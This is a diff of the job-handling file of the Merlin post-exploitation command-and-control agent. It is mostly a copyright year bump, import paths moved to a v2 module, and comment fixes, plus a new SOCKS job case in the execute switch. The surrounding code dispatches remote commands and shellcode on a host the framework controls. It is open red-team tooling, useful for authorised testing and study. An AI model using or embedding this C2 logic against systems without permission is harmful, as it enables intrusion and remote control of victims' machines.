@@ -2,7 +2,7 @@
 Merlin is a post-exploitation command and control framework.
 
 This file is part of Merlin.
-Copyright (C) 2023 Russel Van Tuyl
+Copyright (C) 2024 Russel Van Tuyl
 
 Merlin is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -36,11 +36,11 @@ import (
 	"github.com/Ne0nd0g/merlin-message/jobs"
 
 	// Internal
-	"github.com/Ne0nd0g/merlin-agent/cli"
-	"github.com/Ne0nd0g/merlin-agent/commands"
-	"github.com/Ne0nd0g/merlin-agent/services/agent"
-	"github.com/Ne0nd0g/merlin-agent/services/client"
-	"github.com/Ne0nd0g/merlin-agent/socks"
+	"github.com/Ne0nd0g/merlin-agent/v2/cli"
+	"github.com/Ne0nd0g/merlin-agent/v2/commands"
+	"github.com/Ne0nd0g/merlin-agent/v2/services/agent"
+	"github.com/Ne0nd0g/merlin-agent/v2/services/client"
+	"github.com/Ne0nd0g/merlin-agent/v2/socks"
 )
 
 // Service is the structure used to interact with job objects
@@ -76,7 +76,7 @@ func NewJobService(agentID uuid.UUID) *Service {
 	return memoryService
 }
 
-// AddResult creates a Job Results structure and places it in the out going channel
+// AddResult creates a Job Results structure and places it in the outgoing channel
 func (s *Service) AddResult(agent uuid.UUID, stdOut, stdErr string) {
 	cli.Message(cli.DEBUG, fmt.Sprintf("services/job.AddResult(): entering into function with agent: %s, stdOut: %s, stdErr: %s", agent, stdOut, stdErr))
 	result := jobs.Results{
@@ -278,7 +278,7 @@ func (s *Service) Control(job jobs.Job) {
 	cli.Message(cli.DEBUG, fmt.Sprintf("services/job.Control(): leaving function with %+v", aInfo))
 }
 
-// Handle takes a list of jobs and places them into job channel if they are a valid type, so they can be executed
+// Handle takes a list of jobs and places them into a job channel if they are a valid type, so they can be executed
 func (s *Service) Handle(Jobs []jobs.Job) {
 	cli.Message(cli.DEBUG, fmt.Sprintf("services/job.Handle(): entering into function with %+v", Jobs))
 	for _, job := range Jobs {
@@ -397,6 +397,9 @@ func execute() {
 				result = commands.Native(job.Payload.(jobs.Command))
 			case jobs.SHELLCODE:
 				result = commands.ExecuteShellcode(job.Payload.(jobs.Shellcode))
+			case jobs.SOCKS:
+				socks.Handler(job, &out)
+				return
 			default:
 				result.Stderr = fmt.Sprintf("Invalid job type: %d", job.Type)
 			}
